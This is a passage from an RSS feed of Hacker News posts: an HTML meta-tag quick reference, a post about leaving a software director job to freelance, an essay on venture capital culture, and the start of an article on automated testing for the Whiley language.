        &lt;!--link rel="stylesheet" href="/async.css" media="print" onload="this.media='all'"&gt;--&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;!-- Your Website Body --&gt;
        &lt;!-- Your Main JS Script --&gt;
        &lt;script defer src="local.js"&gt;&lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</pre>

<h2>Meta Tags</h2>
<h3>SEO</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>description<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Description of my website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>robots<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>index,follow<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>keywords<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>tags,for,your,site<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Linking</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>shortlink<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Short form link for this page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>canonical<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>URL for this page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prev<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>URL for the prev page in this series<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>next<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>URL for the next page in this series<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>dns-prefetch<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Link to a DNS server far to lookup early on<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prefetch<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Link to a document or file to prefetch and cache<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>prerender<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>The document should be optimised for rendering on the page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>preload<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>Link to a document or file to prefetch and cache which will be used in the page<span>"</span></span> <span>as</span><span><span>=</span><span>"</span>script<span>"</span></span><span>&gt;</span></span> 
</code></pre>
<h3>General Social Media Page</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:title<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>My Website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:description<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Description of my website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:image<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Image URL representing my website<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:url<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>URL for this page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:site_name<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>My Website<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Twitter</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:card<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>summary_large_image<span>"</span></span><span>&gt;</span></span> 
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:site<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Website URL<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:title<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Title for page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:description<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Description of page<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>twitter:image<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Image of page<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Apple Meta Tags</h3>
<pre><p>html <span>Copy</span></p><code>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>apple-mobile-web-app-capable<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>yes<span>"</span></span><span>&gt;</span></span>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>apple-mobile-web-app-status-bar-style<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>black<span>"</span></span><span>&gt;</span></span>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>format-detection<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>telephone=yes<span>"</span></span><span>&gt;</span></span>
    
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>initial-scale=1, maximum-scale=1<span>"</span></span> <span>user-scalable</span><span><span>=</span><span>"</span>no<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Social Media Video</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video URL<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:secure_url<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Secure Video URL<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:types<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video Format<span>"</span></span><span>&gt;</span></span> 
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:width<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video Width i.e. 100px<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:height<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Video Height i.e. 200px<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>og:video:image<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Placeholder image for video<span>"</span></span><span>&gt;</span></span>
</code></pre>
<h3>Social Media 3d Asset</h3>
<pre><p>html <span>Copy</span></p><code>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:type<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>threed.asset<span>"</span></span><span>&gt;</span></span> 
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:asset<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>/link/to/asset.glb<span>"</span></span><span>&gt;</span></span>
    <span><span><span>&lt;</span>meta</span> <span>property</span><span><span>=</span><span>"</span>og:title<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>Title of asset<span>"</span></span><span>&gt;</span></span>
</code></pre>
                
            </div>
            
        </article>
    </section></div>]]>
            </description>
            <link>https://fjolt.com/article/meta-tag-ref-html-quick-start</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511860</guid>
            <pubDate>Tue, 22 Dec 2020 22:06:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I quit my high-paying job as a software director]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25511668">thread link</a>) | @mojoe
<br/>
December 22, 2020 | https://cloudconsultant.dev/i-quit-my-high-paying-job-as-a-software-director/ | <a href="https://web.archive.org/web/*/https://cloudconsultant.dev/i-quit-my-high-paying-job-as-a-software-director/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1456030680012-9aa5bd962cc4?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDIzfHxvcGVuJTIwcm9hZHxlbnwwfHx8&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="I quit my high-paying job as a software director">
            </figure>

            <section>
                <div>
                    <p>At the end of October I quit my job as a director of software engineering. Many (most?) people view this as insane given the amount of money I was making. I'm not going to give a precise figure here, but if you're really curious you can check out software director salaries on <a href="https://www.levels.fyi/">levels.fyi</a>. I was making enough that in another 5-10 years I could very comfortably retire with a reasonably high standard of living.</p><h3 id="working-on-my-own-terms">Working on my own terms</h3><p>So why did I leave this behind? The concept is simple â€“ I want to see how it feels to work on my own terms. I know how that sounds. If you've hung out for any period of time in tech-oriented communities like Hacker News it's likely that you've seen at least a few posts about people losing motivation at their high-paying tech jobs and wanting to strike out on their own. I always felt a little cognitive dissonance over those posts. On the one hand I completely identified with the desire to firmly seize control of my time and spend it on things that I wanted to do, but I also had this voice in the back of my head that said, "What a ridiculous first-world problem. Sure, other people set their priorities, but they have a pretty high degree of freedom compared to other roles and industries, so they should be thankful for what they've got. Why risk it?"</p><p>Everyone's situation is unique, but I think in my case the downside is limited. At the risk of sounding overconfident, I am very good at my job, and if things go south I believe I can join a large software organization again. The upside is that I can work on lots of different projects, spend more time with my family, and build things that I want to build.</p><h3 id="kids">Kids</h3><p>A huge reason for leaving was that my second child was recently born, and my company had no official paternity leave (if a company is small enough they're not bound by FMLA). With the pandemic raging and my toddler cooped up in the house, I wanted to spend more time with my toddler so my wife could focus on our new son.</p><p>This has been going fantastically so far. We're spending time outside, getting exercise, playing games, and making progress on simple academics. If my wife had to take care of a two year old and a newborn by herself with no support during the workday it would have been a nightmare.</p><p>It can be occasionally tedious (two year olds aren't the most sophisticated conversationalists), and we are all looking forward to the day where my daughter can engage more fully with other kids, go back to the rec center and library, travel with us, etc, but for now our schedule works. I'm very much enjoying our time together.</p><h3 id="financial-stability">Financial stability</h3><p>I don't have the funds to retire â€“ this post would read very differently if I did. I have enough savings to feel secure, but it will be necessary for me to take on contract projects to support my family.</p><p>I may write another post on the financial details of working freelance down the road, but if you're interested in the types of expenses I took into account when quitting Daniel Vassallo has a fantastic post on it: <a href="https://danielvassallo.com/from-employee-to-bootstrapper/">https://danielvassallo.com/from-employee-to-bootstrapper/</a></p><p>I'm currently paying for COBRA health insurance through my old employer, and in general it was important to me that all my insurance coverages continue uninterrupted. I think that the most important points that Daniel emphasizes are ways to avoid financial ruin when you no longer have many of the safety nets that come with large tech employers.</p><h3 id="what-s-next">What's next?</h3><p>I've already started contracting! I have a fairly broad network of friends that I've developed over the last decade in tech, and for now I'm happy sharing my expertise with them and helping to build new products.</p><h3 id="this-blog">This blog</h3><p>I've always enjoyed writing about things I'm interested in and helping others level up their skills. This blog, cloudconsultant.dev, will be focused on news about the major cloud providers (AWS, Azure, and GCP), along with comparisons between the platforms and tips and tricks I've learned while building enterprise software in the cloud. I'm hoping you'll find it easy to read and educational. My secondary objective is to build a conduit to meet potential clients who need help with their cloud projects.</p><p>Please feel free to reach out if you have cloud questions! I'll be looking for interesting cloud topics to post about every week. I plan on making conversational-style posts that will help you keep up to date in a less painful way than just reading Amazon/Microsoft/Google press releases.</p><p>My next post will be a recap of the major cloud feature releases of 2020 â€“ if that sounds interesting, sign up for my mailing list below!</p><p>Until next time,</p><p>Joe</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to The Cloud Consultant</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://cloudconsultant.dev/i-quit-my-high-paying-job-as-a-software-director/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511668</guid>
            <pubDate>Tue, 22 Dec 2020 21:47:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What VC can learn from Bridgewater and journalism]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511481">thread link</a>) | @smalera
<br/>
December 22, 2020 | https://www.businessofbusiness.com/articles/i-went-from-a-hedge-fund-to-journalism-to-venture-capital-heres-what-my-new-industry-can-do-better/ | <a href="https://web.archive.org/web/*/https://www.businessofbusiness.com/articles/i-went-from-a-hedge-fund-to-journalism-to-venture-capital-heres-what-my-new-industry-can-do-better/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-section">
    <!-- .sidebar -->

    <section>
      
      

      <p id="d91a">People often ask me how I got into VC. Itâ€™s a difficult question to answer because the truth isnâ€™t sexy or fun. Getting hired in VC was a winding, frustrating, and often draining process during which I repeatedly convinced myself this wasnâ€™t the path I wanted to take, then reignited interest. Iâ€™m happy to share the nitty gritty with anyone who asks. While I was lucky to have a few investors believe in me, more often than not, interview processes left me exhausted and underwhelmed.</p>
<p id="774c">When I wasnâ€™t â€œ<span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm"><span id="rmm">l</span></span></span></span></span></span></span></span></span></span></span>ooking,â€ the opportunity to join<span>&nbsp;</span><a href="http://nextviewventures.com/" rel="noopener nofollow">NextView Ventures</a><span>&nbsp;</span>arrived. Getting an offer was a tremendous privilege; I do not take it lightly, and I know my gain was the loss of other candidates who were likely equally if not more qualified. Now two months into the job, Iâ€™ve spent a good deal of time reflecting on what would be helpful to share about my early days in venture. There are many resources available on how to get into venture, and millions of â€œwhat Iâ€™ve learned in my first 60 days as a VCâ€ posts. Instead of contributing to the noise, I decided to get real and share what Iâ€™m still struggling with. Which is a lot!</p>
<p id="ba3b">Non-partner venture roles are not easy. Theyâ€™re high pressure, often no- or low carry, and quite vague. You enter not knowing what youâ€™re supposed to do, and youâ€™re rarely presented with a manual. I tend to gauge my professional confidence based on how frequently I use the word â€œshouldâ€ â€” a trick I learned in therapy. My therapist flags when Iâ€™m speaking about what I â€œshouldâ€ be doing or feeling, as opposed to what I am doing, feeling, or thinking. After two months in venture, Iâ€™m saying â€œshouldâ€ a lot.</p>
<p id="65b0">I share this reality not to downplay my abilities or the support of my team â€” which is amazing. Nor am I embarrassed by my â€œshouldâ€-ing; itâ€™s a sign that Iâ€™m pursuing an opportunity that makes me uncomfortable, and thatâ€™s a sign Iâ€™m learning. Those who arenâ€™t should-ing have either been at this way longer than I have, or theyâ€™re lying. I donâ€™t enjoy being bored, and believe that life is too short to stay professionally comfortable.</p>
<p id="d1cb">Iâ€™m being honest about my insecurities and confusions because after cutting my teeth at Bridgewater Associates, one of the most radically transparent workplaces, and building a journalism career rooted in â€œ<a href="https://qz.com/1515462/vulnerability-is-the-key-to-good-sex-and-happiness/" rel="noopener nofollow">vulnerability at scale</a>,â€ I know that pretending you know it all gets you nowhere. I also know that Iâ€™m not the only one struggling, and that as a white woman I have an added privilege to speak up.</p>
<p id="9bd1">Alas, Iâ€™ve put together the top things Iâ€™m not getting about VC. Perhaps itâ€™s because Iâ€™m undereducated or inexperienced, or perhaps itâ€™s because these things truly donâ€™t make sense and should change. Either way, Iâ€™d love to hear your thoughts.</p>
<h2>Weâ€™re all doing the same thing but weâ€™re sketchy about collaboration</h2>
<p>I work at a seed stage fund. I think itâ€™s a wonderful, brilliant fund, with a differentiated perspective and smart humans. Thatâ€™s true of pretty much every other seed stage fund, too. Many of us are qualified and smart. Weâ€™re all hungry for the best deals. Most of us are looking at the same deals. Yet more often than not, we avoid collaboration and keep our cards close to our chests.</p>
<p id="c0e4">This strikes me as a bitâ€¦ wild. Not because I am an idiot â€” I know we cannot all win, and that inviting everyone to your party can amplify competition. This is especially true for partners, as theyâ€™re the ones making the calls and setting the terms. But for junior VCs, I think itâ€™s a different story. Weâ€™ve open-sourced everything in tech beyond our own success. For many of us, our incentive is to see and surface as many of the best deals as possible. Economies of scale would make all our lives a lot easier.</p>
<p id="0bf7">Iâ€™m not suggesting that all junior VCs create a shared spreadsheet, but hey, itâ€™s an â€œextremeâ€ concept worth contemplating. All Iâ€™m saying is that over the past two months, Iâ€™ve made a concerted effort to reach out to seemingly high-quality non-partner investors, genuinely get to know them, and make it clear that Iâ€™m pro-collaboration. I come from newsrooms and early-stage startups, where our teamâ€™s success depends on our ability to collectively source news, ideas, and facts. I intend to take the same approach to venture among those I trust, and those who trust me. I believe our inherent fear of showing our cards is holding us back â€” especially women and people of color.</p>
<h2 id="0d14">Weâ€™re very quick to jump to why it wonâ€™t work</h2>
<p>A common junior VC experience is being amped up after a first call, bringing the company to a partner, and facing either crickets or an immediate no. Cringeworthy as this experience is, I kind of love it. Getting slapped around a bit hardens your skin and encourages you to come prepared. Tough love is love nonetheless.</p>
<p id="088e">That being said, Iâ€™m a bit confused by intense skepticism as a form of social currency in this industry. Since my first days reporting on then interviewing with VC partners, Iâ€™ve noticed that the ability to quickly (if not instantaneously) call out whatâ€™s wrong with a founderâ€™s idea or vision is often equated with intelligence. I find that ironic given our charge is to bet on whatâ€™s possible. Rarely does the future match our predictions, which ought to encourage us to see beyond our squints.</p>
<p id="508b">Healthy skepticism is undoubtedly key to success. As many folks have said, weâ€™re in the business of saying no. What irks me as someone coming in with fresh eyes is how rarely we emphasize that weâ€™re also in the business of saying yes. Of making visions that seem impossible come true.</p>
<p id="15dd">This isnâ€™t a call for blind pipe dreams. My parents nicknamed me Eeyore at age five; I quite enjoy pessimism. Rather, itâ€™s a call for asking how â€œmightâ€ this business succeed before talking about what they â€œshouldâ€™ be doing differently.</p>
<p id="f96d">If partners want to groom their junior teammates into nuanced investors, theyâ€™d be smart to push the conversation toward what is good or exciting about a business before shooting it down. This is a skill NextView partners come to naturally, for which Iâ€™m extremely lucky. When I present an idea â€” no matter how poorly â€” they ask what I like about it, and respond to my enthusiasm with questions and comments, rather than immediate critique. They ask why before saying no. Whatâ€™s more, when they do say no, they distinguish between a â€œthis isnâ€™t for us, but hereâ€™s the squint of how I could see it working,â€ and a â€œno, this has a fatal flaw, and itâ€™s X.â€ Even if the ultimate decision is a pass, this approach helps me learn rather than scaring me into silence. I know I speak for more than myself when I say immediate and unqualified rejection isnâ€™t motivating or educative.</p>
<h2 id="d8a4">Kindness and honesty feel more important than â€œbeing helpfulâ€</h2>
<p id="e64b">All seed funds want to differentiate from other seed funds. Service offerings intended to â€œbe helpfulâ€ to founders are a common refrain. We ask what we can do to â€œadd more value,â€ convincing ourselves that semi-delusional navel gazing is productive. I donâ€™t mean to shoot down service offerings â€” many are impressive and convert deals. But Iâ€™m unsure whether, on an individual investor level, â€œbeing helpfulâ€ is more important than being kind and real.</p>
<p id="8463">To reiterate, Iâ€™ve been at this for two months and am a<span>&nbsp;</span><a href="https://qz.com/work/1294686/bridgewater-associates-ceo-ray-dalios-advice-to-college-and-high-school-graduates-you-know-nothing/" rel="noopener nofollow">Dalio-certified â€œdumb shit.â€</a><span>&nbsp;</span>However, with the founders Iâ€™ve met through NextView and as an angel, it seems the most helpful thing I can do is to tell them the truth and not be an asshole. Founders are engaging with VCs for money not for fun or new buddies. Our job is to give them that money or get out of the way, while also convincing them that our experience giving other people money makes us a valuable sounding board and differentiates our undifferentiated capital.</p>
<p id="46ad">When we write rejection or mid-deal emails, we ought to focus less on value-add platitudes and more on honesty: Whatâ€™s good about the foundersâ€™ business, and whatâ€™s not working in our eyes. Admission that we could be wrong. The truth about why can or canâ€™t we â€œget thereâ€ â€” founders have thick skin, they can handle it. What would need to be different for us to have more conviction in this business? Where might we be ignorant of our own blinders. This feedback does take a minute or two extra, but somewhat counterintuitively, it results in higher trust, which translates to founders sending more information and more deals â€” even if you pass on them.</p>
<p id="1f1f">Perhaps most importantly, both in founder and intra-fund relationships, our honesty should not outweigh kindness and respect. It confuses me when people think being mean or hyper-intense makes them powerful, when in fact, it makes you seem insecure. As investors and teammates, I think weâ€™ll win by being good people â€” by being genuinely invested in one anotherâ€™s success (pun intended), and open-minded enough to listen to one anotherâ€™s perspectives. At NextView we tend to believe that our teamâ€™s brain trust is worth more than its independent parts. The same goes for the founders we meet, inclusive of those we pass on. Confidence comes from conversation and consideration, not from being right.</p>
<p id="bcf3"><em>If these reflections resonate, feel free to let me know<span>&nbsp;</span></em><a href="https://twitter.com/LeahFessler" rel="noopener nofollow"><em>@LeahFessler.</em></a><em><span>&nbsp;</span>If not, be kind.</em></p>
<p id="1814"><em>Thank you to<span>&nbsp;</span></em><a href="https://twitter.com/jay_drainjr" rel="noopener nofollow"><em>Jay Drain Jr.</em></a><em><span>&nbsp;</span>and<span>&nbsp;</span></em><a href="https://twitter.com/davidbeisel" rel="noopener nofollow"><em>David Beisel</em></a><em><span>&nbsp;</span>for reading my drafts. I appreciate you.</em></p>
<p><em>This post originally appeared on <a href="https://leahmfessler.medium.com/ive-been-in-venture-capital-for-two-months-here-s-what-still-makes-no-sense-f9e3b28668f9">Medium</a> and is republished here with the author's permission.</em></p>
      

      

      



    </section><!-- .article-body -->

    
  </div></div>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/i-went-from-a-hedge-fund-to-journalism-to-venture-capital-heres-what-my-new-industry-can-do-better/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25511481</guid>
            <pubDate>Tue, 22 Dec 2020 21:30:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[QuickCheck for Whiley]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25511412">thread link</a>) | @todsacerdoti
<br/>
December 22, 2020 | https://whileydave.com/2020/12/02/automated-testing-for-whiley/ | <a href="https://web.archive.org/web/*/https://whileydave.com/2020/12/02/automated-testing-for-whiley/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div onclick="clearMenu()"><div><p>Wednesday, December
2nd,
2020</p><hr><p>Recently, the <a href="http://whileylabs.com/">online editor for Whiley</a> was updated with some new features. Actually, the update represents a <em>complete rewrite of the front-end in Whiley</em>. Obviously, I am very excited about that! Previously it was written using raw (i.e. ugly) JavaScript, but now uses a framework for <a href="https://www.youtube.com/watch?v=yYGEcyCHiZk">Functional Reactive Programming</a> (called <a href="https://github.com/DavePearce/Web.wy">Web.wy</a>). That has made a huge difference to how the code looks. Still, Iâ€™m not going to talk about that here. Rather, it is the new <em>check</em> feature (highlighted in red below) that Iâ€™m interested in:</p><figure><a href="http://whileylabs.com/"><img width="80%" alt="Illustrating a screenshot of whileylabs.com with the check option highlighted." src="https://whileydave.com/images/2020/AutomatedTesting_WhileyLabs.png"></a></figure><p><em>What is this new â€œcheckâ€ feature then?</em> In a nutshell, it automatically generates test inputs for functions and runs them through the code looking for problems (e.g. <em>divide-by-zero</em>, <em>index-out-of-bounds</em>, etc). In many ways, it is similar to the <a href="https://en.wikipedia.org/wiki/QuickCheck">QuickCheck</a> line of tools (with the added benefit that Whiley has first-class specifications). We can think of it as a â€œhalf-wayâ€ step towards formal verification. The key is that it is easier to check a program than it is to statically verify it (more on this below). Some might think that having a check feature like this doesnâ€™t make sense when you also have static verification. But, I prefer to think of them as <em>complementary</em>. Thinking about a developerâ€™s workflow, we might imagine checking a function first as we develop it (since this is easier and quicker) before, finally, attempting to statically verify it (since this is harder and may force the specification to be further refined).</p><h2 id="example">Example</h2><p>As a simple example to illustrate how it works, consider the following
signature for the <code>max(int[])</code> function:</p><div><pre><code data-lang="c">function <span>max</span>(<span>int</span>[] items) <span>-&gt;</span> (<span>int</span> r)
<span>// items cannot be empty
</span><span></span>requires <span>|</span>items<span>|</span> <span>&gt;</span> <span>0</span>
<span>// result not smaller than any in items
</span><span></span>ensures all { i in <span>0.</span>.<span>|</span>items<span>|</span> <span>|</span> r <span>&gt;=</span> items[i] }
<span>// result is element in items
</span><span></span>ensures some { i in <span>0.</span>.<span>|</span>items<span>|</span> <span>|</span> r <span>==</span> items[i] }<span>:</span>
   ...
</code></pre></div><p>Weâ€™re not really concerned with the implementation here (and we can
assume it might have bugs). To check this function, the tool will do
the following:</p><ol><li><p><strong>(Generate)</strong> The tool generates some number of valid inputs.
That is, input values which meet the precondition. For our example
above, that is any <code>int[]</code> array containing at least one element.</p></li><li><p><strong>(Execute)</strong>. The function in question is then executed using
each of the generated inputs. This may lead to obvious failures
(e.g. out-of-bounds or divide-by-zero errors), in which case weâ€™ve
already found some bugs!</p></li><li><p><strong>(Check)</strong>. For any execution which completed, the tool then
checks the result against the postcondition. If the postcondition
doesnâ€™t hold then, again, this indicates a bug somewhere.</p></li></ol><p>The key is that the specification acts as the <a href="https://en.wikipedia.org/wiki/Test_oracle">test
oracle</a>. In other words,
<em>having written the specification we get testing for free</em>! And, the
tool takes care of the difficult stuff so we donâ€™t have to. For
example, generating valid inputs efficiently is harder than it looks
(more on this below).</p><h2 id="technical-stuff">Technical Stuff</h2><p>The main technical challenge is that of efficiently generating <em>input
values under constraints</em>. To start with, we can generate raw input
values for the various data types in Whiley:</p><ul><li><p><strong>Primitives.</strong> These are pretty easy. For example, to generate
values of type <code>int</code>, weâ€™ll use some (configurable) domain
(e.g. <code>-2 .. 2</code>) of values. We can easily sample uniformly
from this domain as well (e.g. using Knuthâ€™s <a href="https://rosettacode.org/wiki/Knuth%27s_algorithm_S">Algorithm
S</a>).</p></li><li><p><strong>Arrays</strong>. Here, we limit the maximum length of an array
(e.g. length <code>2</code>), and then enumerate all arrays upto this
length. To generate values in the array, we recursively call
the generator associated with the element type. For the array
type <code>int[]</code> and assuming max length <code>2</code> and integers <code>-1..1</code>,
we might generate: <code>[]</code>, <code>[-1]</code>, <code>[0]</code>, <code>[1]</code>, <code>[-1,-1]</code>,
<code>[0,-1]</code>,<code>[1,-2]</code>, etc.</p></li><li><p><strong>Records</strong>. These are similar, except there is no maximum
length. For each field, we recursively generate values using
the generator associated with its type. For the record type
<code>{bool flag, int data}</code> and assuming and integers <code>-1..1</code>, we
might generate: <code>{flag:false,data:-1}</code>, <code>{flag:true,data:-1}</code>,
<code>{flag:false,data:0}</code>, <code>{flag:true,data:0}</code>,
<code>{flag:false,data:1}</code>, etc.</p></li><li><p><strong>References</strong>. These are more tricky as we must allow for
aliasing between heap locations. For a single reference type
<code>&amp;int</code>, we generate heap locations for each of the possible
integer values. However, for two reference types
(e.g. parameters <code>&amp;int x, &amp;int y</code>), we have to additionally
consider both the <em>aliased</em> and <em>non-aliased</em> cases.</p></li><li><p><strong>Lambdas</strong>. These are very challenging as, in principle, it
requires enumerating all implementations of a function!
Consider the lambda type <code>function(int)-&gt;(int)</code> â€” <em>how do we
generate values (i.e. implementations) of this type?</em> There is
no easy answer here, but there are some strategies we can use.
Firstly, we can scour the source program looking for functions
with the same signature. Secondly, we can generate simple
input/output mappings (e.g. <code>{-1=&gt;-1, 0=&gt;0, 1=&gt;1}</code>). We can go
beyond this by applying <em>rotations</em> (e.g. <code>{-1=&gt;0, 0=&gt;1, 1=&gt;-1}</code>).</p></li></ul><p>Given the ability to generate arbitrary values for a type, the more
difficult question is how to generate values which meet some
constraint. For example, consider this data type:</p><div><pre><code data-lang="c">type List<span>&lt;</span>T<span>&gt;</span> is {
     <span>int</span> length,
